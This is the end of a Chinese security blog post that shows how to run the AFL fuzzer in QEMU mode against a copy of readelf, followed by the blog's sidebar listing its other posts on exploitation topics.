<h3 id="对readelf进行fuzz"><a href="#对readelf进行fuzz" class="headerlink" title="对readelf进行fuzz"></a>对readelf进行fuzz</h3><p>以readelf为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$mkdir afl_in afl_out</span><br><span class="line">$cp test afl_in</span><br><span class="line">test为自己准备的测试elf</span><br><span class="line">$sudo cp /usr/bin/readelf .</span><br><span class="line">$afl_fuzz -i afl_in -o afl_out -Q readelf -a @@</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>






<nav id="pagination">
  
</nav>
</div></div>
    <aside id="sidebar" class="alignright">
  

  
<div class="widget tag">
  <h3 class="title">archives</h3>
  <ul class="entry">
    
      <li>
        <a href="/2018/10/21/线下赛/">线下赛</a>
      </li>
    
      <li>
        <a href="/2018/10/21/漏洞挖掘/">漏洞挖掘</a>
      </li>
    
      <li>
        <a href="/2018/10/21/文件读写内存实例/">文件读写内存实例</a>
      </li>
    
      <li>
        <a href="/2018/10/21/堆溢出/">堆溢出</a>
      </li>
    
      <li>
        <a href="/2018/10/21/分布式/">分布式搭建</a>
      </li>
    
      <li>
        <a href="/2018/10/21/内核编译/">内核编译</a>
      </li>
    
      <li>
        <a href="/2018/10/21/关闭nx与反弹shell/">关闭nx与反弹shell</a>
      </li>
    
      <li>
        <a href="/2018/10/21/两道内核/">两道内核</a>
      </li>
    
      <li>
        <a href="/2018/10/21/windows机制/">windows机制</a>
      </li>
    
      <li>
        <a href="/2018/10/21/windbg学习总结/">windbg学习总结</a>
      </li>
    
      <li>
        <a href="/2018/10/21/web/">随意码的web</a>
      </li>
    
      <li>
        <a href="/2018/10/21/sulb/">slub</a>
      </li>
    
      <li>
        <a href="/2018/10/21/rtd/">return to dl-resolve</a>
      </li>
    
      <li>
        <a href="/2018/10/21/pwnable.tw/">pwnable.tw总结</a>
      </li>
    
      <li>
        <a href="/2018/10/21/patch/">patch</a>
      </li>
    
      <li>
        <a href="/2018/10/21/offbyone/">off-by-one</a>
      </li>
    
      <li>
        <a href="/2018/10/21/hor/">House-Of-Rabbit</a>
      </li>
    
      <li>
        <a href="/2018/10/21/hfo/">house-of-orange</a>
      </li>
    
      <li>
        <a href="/2018/10/21/hexo/">搭建博客</a>
      </li>
    
      <li>
        <a href="/2018/10/21/glibc malloc和free/">glibc malloc和free</a>
      </li>
    
      <li>
        <a href="/2018/10/21/doublefree/">double free</a>
      </li>
    
      <li>
        <a href="/2018/10/21/brop/">brop</a>
      </li>
    
      <li>
        <a href="/2018/10/21/bpf/">bpf</a>
      </li>
    
      <li>
        <a href="/2018/10/21/afl/">afl</a>
      </li>
    
  </ul>
</div>


  

  
</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  <p>
  
  &copy; 2018 another
  
  All rights reserved.</p>
  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
</div>
<div class="clearfix"></div>

<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
  <script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


<div id='bg'></div>
</body>
</html>